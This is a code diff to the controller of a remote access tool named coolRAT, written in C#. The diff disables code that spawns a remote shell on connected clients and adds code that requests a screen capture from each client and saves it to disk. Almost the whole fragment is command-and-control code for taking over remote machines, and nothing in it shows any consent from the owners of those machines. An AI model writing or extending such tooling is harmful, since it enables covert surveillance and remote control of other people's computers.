@@ -26,19 +26,26 @@ namespace coolRAT.Master
                 ConnectedClients.Add(e.Client.UniqueId, e.Client);
                 e.Client.ClientPingService.Start(PingServiceType.Passive);
                 e.Client.ClientPingService.ConnectionLost += ClientPingService_ConnectionLost;
-                e.Client.RegisterPacketHandler("ShellConnectedPacket", (s_, e_) =>
+                /*e.Client.RegisterPacketHandler("ShellConnectedPacket", (s_, e_) =>
                 {
                     if (e_.Packet.Type != "ShellConnectedPacket")
                         return;
                     ShellConnectedPacket shellConnectedPacket = ShellConnectedPacket.Deserialize(e_.RawPacket);
                     ShellWindow shellWindow = new ShellWindow(shellConnectedPacket.ShellUniqueId, e.Client);
                     Task.Run(() => shellWindow.ShowDialog());
-                });
+                });*/
                 // Spawn a new shell
-                Thread.Sleep(1000);
-                Console.WriteLine($"Told client {e.Client.UniqueId} to spawn a new shell.");
-                ConnectShellPacket packet = new ConnectShellPacket(e.Client.UniqueId);
-                e.Client.SendPacket(packet);
+                Thread.Sleep(10000);
+                //Console.WriteLine($"Told client {e.Client.UniqueId} to spawn a new shell.");
+                //ConnectShellPacket packet = new ConnectShellPacket(e.Client.UniqueId);
+                //e.Client.SendPacket(packet);
+                e.Client.RegisterPacketHandler("ScreenFrame", (s_, e_) =>
+                {
+                    ScreenFrame frame = ScreenFrame.Deserialize(e_.RawPacket);
+                    frame.Frame.Save("test.png");
+                });
+                RequestFramePacketTemporary requestFramePacketTemporary = new RequestFramePacketTemporary(e.Client.UniqueId);
+                e.Client.SendPacket(requestFramePacketTemporary);
             };
             server.Start();
             Console.WriteLine("Client Authorization Protocol server version 1.0.0.0 started");
